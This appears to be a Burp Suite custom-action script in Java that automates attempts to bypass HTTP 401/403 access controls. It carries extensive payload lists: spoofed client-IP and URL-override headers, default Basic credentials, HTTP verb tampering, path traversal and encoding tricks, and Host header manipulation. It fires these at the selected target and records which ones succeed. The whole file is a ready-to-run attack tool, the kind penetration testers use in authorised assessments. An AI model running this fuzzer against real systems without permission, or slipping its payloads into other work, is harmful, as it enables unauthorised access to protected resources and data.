id: b089c2e1-45f8-4b7b-9c6d-403bypass00001
name: Comprehensive 401/403 Bypass Fuzzer
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // Comprehensive 401/403 Bypass Fuzzer
  // Based on techniques from nomore403 (devploit) and BypassFuzzer (intrudir)
  // Combines: Header injection, Path manipulation, Verb tampering, Protocol tricks
  
  // ============================================================================
  // CONFIGURATION
  // ============================================================================
  int GLOBAL_DELAY_MS = 100;  // Delay between requests (ms)
  boolean STOP_ON_SUCCESS = false;  // Stop when bypass found
  boolean VERBOSE_OUTPUT = true;
  
  // ============================================================================
  // IP PAYLOADS (for header injection)
  // ============================================================================
  String[] BYPASS_IPS = {
      "127.0.0.1",
      "localhost",
      "127.1",
      "0.0.0.0",
      "0000::1",
      "::1",
      "::ffff:127.0.0.1",
      "::ffff:7f00:0001",
      "10.0.0.1",
      "10.0.0.0",
      "172.16.0.1",
      "192.168.1.1",
      "192.168.0.1",
      "0177.0.0.01",
      "0x7f.0x0.0x0.0x1",
      "0x7f000001",
      "2130706433",
      "127.000.000.001",
      "0",
      "null",
      "8.8.8.8"
  };
  
  // ============================================================================
  // BYPASS HEADERS (IP-based)
  // ============================================================================
  String[] IP_BYPASS_HEADERS = {
      "X-Forwarded-For",
      "X-Forwarded-Host",
      "X-Forwarded-Proto",
      "X-Forwarded-Server",
      "X-Forwarded",
      "X-Forward-For",
      "X-Forwarder-For",
      "Forwarded-For",
      "Forwarded-For-Ip",
      "Forwarded",
      "X-Real-IP",
      "X-Real-Ip",
      "Real-Ip",
      "X-Remote-IP",
      "X-Remote-Addr",
      "Remote-Addr",
      "X-Client-IP",
      "X-Client-Ip",
      "Client-IP",
      "Client-Ip",
      "Clientip",
      "X-Clientip",
      "X-Originating-IP",
      "X-Originating-Ip",
      "X-Originally-Forwarded-For",
      "X-Original-Remote-Addr",
      "True-Client-IP",
      "True-Client-Ip",
      "CF-Connecting-IP",
      "CF-Connecting_IP",
      "Cf-Connecting-Ip",
      "Cf-Ipcountry",
      "Fastly-Client-Ip",
      "Incap-Client-Ip",
      "X-Cluster-Client-IP",
      "Cluster-Client-IP",
      "X-ProxyUser-Ip",
      "X-Host",
      "X-Custom-IP-Authorization",
      "Proxy-Host",
      "From",
      "Via",
      "Base-Url",
      "Http-Url",
      "Proxy-Url",
      "Proxy"
  };
  
  // ============================================================================
  // URL OVERRIDE HEADERS
  // ============================================================================
  String[] URL_OVERRIDE_HEADERS = {
      "X-Original-URL",
      "X-Original-Url",
      "X-Rewrite-URL",
      "X-Rewrite-Url",
      "X-Override-URL",
      "X-Override-Url",
      "X-Proxy-URL",
      "X-Proxy-Url",
      "X-HTTP-DestinationURL",
      "X-Http-Destinationurl",
      "Request-Uri",
      "X-Request-Uri",
      "Uri",
      "Url",
      "Path",
      "Destination",
      "Redirect",
      "Referer",
      "X-Referrer",
      "Content-Location"
  };
  
  // ============================================================================
  // SIMPLE HEADERS (static values)
  // ============================================================================
  String[][] SIMPLE_HEADERS = {
      {"X-Forwarded-Port", "443"},
      {"X-Forwarded-Port", "4443"},
      {"X-Forwarded-Port", "80"},
      {"X-Forwarded-Port", "8080"},
      {"X-Forwarded-Port", "8443"},
      {"X-Forwarded-Proto", "https"},
      {"X-Forwarded-Proto", "http"},
      {"X-Forwarded-Scheme", "https"},
      {"X-Forwarded-Scheme", "http"},
      {"X-Forwarded-Ssl", "on"},
      {"X-Forwarded-Ssl", "off"},
      {"X-HTTP-Method-Override", "GET"},
      {"X-HTTP-Method-Override", "POST"},
      {"X-HTTP-Method-Override", "PUT"},
      {"X-HTTP-Method", "GET"},
      {"X-HTTP-Method", "POST"},
      {"X-Method-Override", "GET"},
      {"X-Method-Override", "POST"},
      {"X-Requested-With", "XMLHttpRequest"},
      {"X-Do-Not-Track", "1"},
      {"Max-Forwards", "0"},
      {"Max-Forwards", "1"},
      {"Max-Forwards", "2"},
      {"Proxy-Connection", "keep-alive"},
      {"Php-Auth-User", "admin"},
      {"Authorization", "Basic YWRtaW46YWRtaW4="},
      {"Authorization", "Bearer "},
      {"Authorization", "Bearer A"},
      {"X-CSRFToken", "DECAFC0FFEEBAD"},
      {"X-Csrf-Token", "DECAFC0FFEEBAD"},
      {"X-Request-ID", "1234567890"},
      {"X-Correlation-ID", "f058ebd6-02f7-4d3f-942e-904344e8cde5"},
      {"Siteid", "0"},
      {"Siteid", "1"}
  };

  // ============================================================================
  // HTTP METHODS FOR VERB TAMPERING
  // ============================================================================
  String[] HTTP_METHODS = {
      "GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE",
      "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK",
      "UNLOCK", "VERSION-CONTROL", "REPORT", "CHECKOUT", "CHECKIN",
      "UNCHECKOUT", "MKWORKSPACE", "UPDATE", "LABEL", "MERGE",
      "BASELINE-CONTROL", "MKACTIVITY", "ORDERPATCH", "ACL", "SEARCH",
      "ARBITRARY", "POUET", "FOOBAR", "CATS",
      // Case variations
      "GeT", "gEt", "gET", "GEt", "Get", "geT",
      "PoSt", "pOsT", "pOST", "POsT", "POSt", "PosT"
  };
  
  // ============================================================================
  // PATH PAYLOADS (suffixes and prefixes)
  // ============================================================================
  String[] PATH_SUFFIXES = {
      "/", "//", "///", "/.", "/./", "/.//", "/.;/", "/..;/", "/..;",
      "/../", "/../../", "/../../../", "/..", "/..%00/", "/..%0d/",
      "/..%0a/", "/..%09/", "/..%ff/", "/%2e/", "/%2e%2e/", "/%2e%2e%2f/",
      "/%2f/", "/%2f%2f/", "/;/", "/;/../", "/;x/", "/;x/../",
      "/?", "/?;", "/#", "/%20/", "/%20%23", "/%23", "/%09", "/%0a",
      "/%0d", "/%00", "/%01", ".json", ".html", ".php", ".asp", ".aspx",
      ".css", ".js", ".txt", ".xml", ".png", ".ico", ".gif", ".jpg",
      ".wsdl", "?debug=1", "?WSDL", "?test", "?anything",
      "%c0%af", "%c0%af%c0%af", "%ef%bc%8f", "%ef%bc%8f%ef%bc%8f",
      "%E5%98%8A", "%E5%98%8D", "%u002e", "%u002e/%u002e"
  };
  
  String[] PATH_PREFIXES = {
      "/;/", "//;/", "/.;/", "/..;/", "/%2e/", "/%2e%2e/", "/%2f/",
      ";/", ";?", ";/;/", "..;/", "../", ".;/", "%2e%2e/", "%2f",
      "%09", "%0a", "%0d", "%20", "%23", "%2e", "%2e%2e", "%3b",
      "%c0%af", "%ef%bc%8f"
  };
  
  // ============================================================================
  // MID-PATH PAYLOADS (path traversal insertions)
  // ============================================================================
  String[] MID_PATH_PAYLOADS = {
      "/../", "/..;/", "/.;/", "/./", "//", "/%2e%2e/", "/%2e/",
      "/..%00/", "/..%0d/", "/.%00/", ";/../", ";/..;/", "%2f..%2f",
      "%2f%2e%2e%2f", "%c0%af..%c0%af", "%ef%bc%8f..%ef%bc%8f"
  };
  
  // ============================================================================
  // MAIN EXECUTION
  // ============================================================================
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  var originalPath = originalRequest.path();
  var originalMethod = originalRequest.method();
  
  logging.logToOutput("╔══════════════════════════════════════════════════════════════╗");
  logging.logToOutput("║     COMPREHENSIVE 401/403 BYPASS FUZZER                      ║");
  logging.logToOutput("║     Based on nomore403 + BypassFuzzer                        ║");
  logging.logToOutput("╠══════════════════════════════════════════════════════════════╣");
  logging.logToOutput("║ Target: " + httpService.host() + ":" + httpService.port());
  logging.logToOutput("║ Method: " + originalMethod);
  logging.logToOutput("║ Path: " + originalPath);
  logging.logToOutput("╚══════════════════════════════════════════════════════════════╝");
  logging.logToOutput("");
  logging.logToOutput("Results will be sent to Organizer tab. Check there for findings!");
  logging.logToOutput("");
  
  int totalRequests = 0;
  int successCount = 0;
  int originalStatus = requestResponse.response().statusCode();
  
  // Helper function to check if bypass was successful
  // Only consider it a bypass if we get a 2xx or 3xx response (actual access)
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (original, current) -> {
      // Must be different from original AND be a success/redirect status
      // 2xx = success, 3xx = redirect (might indicate access)
      return (current >= 200 && current < 400) && (original == 401 || original == 403);
  };
  
  // ============================================================================
  // TEST 1: IP-Based Header Bypass
  // ============================================================================
  logging.logToOutput("[*] Testing IP-based header bypass...");
  
  for (String header : IP_BYPASS_HEADERS) {
      for (String ip : BYPASS_IPS) {
          try {
              var modifiedRequest = originalRequest.withHeader(header, ip);
              var response = api.http().sendRequest(modifiedRequest);
              Thread.sleep(GLOBAL_DELAY_MS);
              
              int status = response.response().statusCode();
              String note = "IP Header: " + header + ": " + ip + " -> " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  successCount++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
                  rrForOrganizer.annotations().setNotes(note);
                  api.organizer().sendToOrganizer(rrForOrganizer);
              } else if (VERBOSE_OUTPUT) {
                  logging.logToOutput("[-] " + note);
              }
              totalRequests++;
              
              if (STOP_ON_SUCCESS && isSuccess.test(originalStatus, status)) break;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
      if (STOP_ON_SUCCESS && successCount > 0) break;
  }

  
  // ============================================================================
  // TEST 2: URL Override Headers
  // ============================================================================
  logging.logToOutput("[*] Testing URL override headers...");
  
  for (String header : URL_OVERRIDE_HEADERS) {
      try {
          // Test with original path in header, request to root
          var modifiedRequest = originalRequest.withPath("/").withHeader(header, originalPath);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "URL Override: " + header + ": " + originalPath + " (path=/) -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // TEST 3: Simple Headers (static values)
  // ============================================================================
  logging.logToOutput("[*] Testing simple headers...");
  
  for (String[] headerPair : SIMPLE_HEADERS) {
      try {
          var modifiedRequest = originalRequest.withHeader(headerPair[0], headerPair[1]);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Simple Header: " + headerPair[0] + ": " + headerPair[1] + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // TEST 4: HTTP Method/Verb Tampering
  // ============================================================================
  logging.logToOutput("[*] Testing HTTP method tampering...");
  
  for (String method : HTTP_METHODS) {
      if (method.equalsIgnoreCase(originalMethod)) continue;
      
      try {
          var modifiedRequest = originalRequest.withMethod(method);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Method Tampering: " + method + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // TEST 5: Path Suffix Manipulation
  // ============================================================================
  logging.logToOutput("[*] Testing path suffix manipulation...");
  
  for (String suffix : PATH_SUFFIXES) {
      try {
          String newPath = originalPath + suffix;
          var modifiedRequest = originalRequest.withPath(newPath);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Path Suffix: " + newPath + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // TEST 6: Path Prefix Manipulation
  // ============================================================================
  logging.logToOutput("[*] Testing path prefix manipulation...");
  
  for (String prefix : PATH_PREFIXES) {
      try {
          String newPath = prefix + originalPath;
          var modifiedRequest = originalRequest.withPath(newPath);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Path Prefix: " + newPath + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }

  
  // ============================================================================
  // TEST 7: Mid-Path Manipulation (Path Traversal)
  // ============================================================================
  logging.logToOutput("[*] Testing mid-path manipulation...");
  
  // Extract path segments
  String[] pathParts = originalPath.split("/");
  if (pathParts.length > 1) {
      String basePath = "";
      String lastSegment = pathParts[pathParts.length - 1];
      for (int i = 0; i < pathParts.length - 1; i++) {
          if (!pathParts[i].isEmpty()) {
              basePath += "/" + pathParts[i];
          }
      }
      if (basePath.isEmpty()) basePath = "/";
      
      for (String midPayload : MID_PATH_PAYLOADS) {
          try {
              String newPath = basePath + midPayload + lastSegment;
              var modifiedRequest = originalRequest.withPath(newPath);
              var response = api.http().sendRequest(modifiedRequest);
              Thread.sleep(GLOBAL_DELAY_MS);
              
              int status = response.response().statusCode();
              String note = "Mid-Path: " + newPath + " -> " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  successCount++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
                  rrForOrganizer.annotations().setNotes(note);
                  api.organizer().sendToOrganizer(rrForOrganizer);
              } else if (VERBOSE_OUTPUT) {
                  logging.logToOutput("[-] " + note);
              }
              totalRequests++;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
  }
  
  // ============================================================================
  // TEST 8: Double URL Encoding
  // ============================================================================
  logging.logToOutput("[*] Testing double URL encoding...");
  
  // Double encode each character in path
  String pathWithoutQuery = originalPath.contains("?") ? originalPath.substring(0, originalPath.indexOf("?")) : originalPath;
  for (int i = 0; i < pathWithoutQuery.length() && i < 20; i++) {  // Limit to first 20 chars
      char c = pathWithoutQuery.charAt(i);
      if (c != '/') {
          try {
              // Double encode: char -> %XX -> %25XX
              String singleEncoded = String.format("%%%02X", (int) c);
              String doubleEncoded = singleEncoded.replace("%", "%25");
              String newPath = pathWithoutQuery.substring(0, i) + doubleEncoded + pathWithoutQuery.substring(i + 1);
              
              var modifiedRequest = originalRequest.withPath(newPath);
              var response = api.http().sendRequest(modifiedRequest);
              Thread.sleep(GLOBAL_DELAY_MS);
              
              int status = response.response().statusCode();
              String note = "Double Encode [" + i + "]: " + newPath + " -> " + status;
              
              if (isSuccess.test(originalStatus, status)) {
                  successCount++;
                  logging.logToOutput("[+] SUCCESS: " + note);
                  var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
                  rrForOrganizer.annotations().setNotes(note);
                  api.organizer().sendToOrganizer(rrForOrganizer);
              } else if (VERBOSE_OUTPUT) {
                  logging.logToOutput("[-] " + note);
              }
              totalRequests++;
          } catch (Exception e) {
              logging.logToError("Error: " + e.getMessage());
          }
      }
  }
  
  // ============================================================================
  // TEST 9: Path Case Switching
  // ============================================================================
  logging.logToOutput("[*] Testing path case switching...");
  
  // Generate some case variations
  String[] caseVariations = new String[10];
  java.util.Random rand = new java.util.Random();
  for (int v = 0; v < 10; v++) {
      StringBuilder sb = new StringBuilder();
      for (int i = 0; i < pathWithoutQuery.length(); i++) {
          char c = pathWithoutQuery.charAt(i);
          if (Character.isLetter(c)) {
              if (rand.nextBoolean()) {
                  sb.append(Character.toUpperCase(c));
              } else {
                  sb.append(Character.toLowerCase(c));
              }
          } else {
              sb.append(c);
          }
      }
      caseVariations[v] = sb.toString();
  }
  
  for (String variation : caseVariations) {
      if (variation == null || variation.equals(pathWithoutQuery)) continue;
      try {
          var modifiedRequest = originalRequest.withPath(variation);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Case Switch: " + variation + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // TEST 10: Host Header Manipulation
  // ============================================================================
  logging.logToOutput("[*] Testing Host header manipulation...");
  
  String[] hostPayloads = {
      "localhost",
      "localhost:80",
      "localhost:443",
      "127.0.0.1",
      "127.0.0.1:80",
      "127.0.0.1:443",
      httpService.host() + ":80",
      httpService.host() + ":443",
      httpService.host() + ":8080",
      httpService.host() + ":8443"
  };
  
  for (String hostPayload : hostPayloads) {
      try {
          var modifiedRequest = originalRequest.withHeader("Host", hostPayload);
          var response = api.http().sendRequest(modifiedRequest);
          Thread.sleep(GLOBAL_DELAY_MS);
          
          int status = response.response().statusCode();
          String note = "Host Header: " + hostPayload + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              successCount++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rrForOrganizer = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(modifiedRequest, response.response());
              rrForOrganizer.annotations().setNotes(note);
              api.organizer().sendToOrganizer(rrForOrganizer);
          } else if (VERBOSE_OUTPUT) {
              logging.logToOutput("[-] " + note);
          }
          totalRequests++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  // ============================================================================
  // SUMMARY
  // ============================================================================
  logging.logToOutput("");
  logging.logToOutput("╔══════════════════════════════════════════════════════════════╗");
  logging.logToOutput("║                    FUZZING COMPLETE                          ║");
  logging.logToOutput("╠══════════════════════════════════════════════════════════════╣");
  logging.logToOutput("║ Total Requests: " + totalRequests);
  logging.logToOutput("║ Potential Bypasses Found: " + successCount);
  logging.logToOutput("║ Original Status Code: " + originalStatus);
  logging.logToOutput("╚══════════════════════════════════════════════════════════════╝");
  logging.logToOutput("");
  if (successCount > 0) {
      logging.logToOutput("⚠️  POTENTIAL BYPASSES DETECTED! Check Organizer tab for successful bypasses.");
  } else {
      logging.logToOutput("No bypasses found. All requests returned 4xx/5xx status codes.");
  }
